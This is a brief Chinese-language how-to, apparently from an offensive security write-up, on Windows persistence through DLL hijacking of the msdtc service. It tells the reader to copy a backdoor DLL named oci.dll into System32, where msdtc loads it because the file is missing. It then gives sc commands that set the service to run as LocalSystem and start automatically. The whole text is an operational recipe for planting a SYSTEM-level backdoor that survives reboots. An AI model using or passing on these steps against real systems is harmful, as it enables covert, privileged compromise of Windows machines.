`msdtc.exe`是微软分布式传输协调程序，开启之后会尝试加载三个dll文件,但是缺失`oci.dll`，所以把后门dll复制到`C:\Windows\System32`里面，然后设置如下:

```
sc qc msdtc
sc config msdtc obj= LocalSystem  //设置System启动，默认network
sc config msdtc start= auto
```